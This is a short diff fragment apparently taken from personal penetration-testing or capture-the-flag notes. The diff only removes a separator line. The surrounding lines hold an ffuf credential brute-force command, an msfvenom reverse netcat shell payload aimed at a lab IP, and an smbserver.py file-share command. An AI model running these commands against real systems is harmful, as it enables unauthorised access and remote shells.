@@ -336,5 +336,4 @@ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Cr
 msfvenom -p cmd/unix/reverse_netcat LHOST=10.50.105.183 LPORT=443
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 
-----
  smbserver.py Lab "/path/to/file"
